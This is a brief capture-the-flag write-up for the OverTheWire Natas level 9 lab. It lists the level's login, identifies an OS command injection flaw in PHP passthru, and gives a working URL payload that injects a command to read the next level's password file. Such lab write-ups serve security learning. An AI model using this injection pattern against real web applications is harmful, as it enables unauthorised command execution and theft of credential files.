# Username
natas9
# Password
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
# Web vulnerability
OS Command Injection. Sourcecode analysis.
# Method of solve
Look at the sourcecode. See that it's using the PHP passthru function. Use simple injection payloads
```
http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search
```
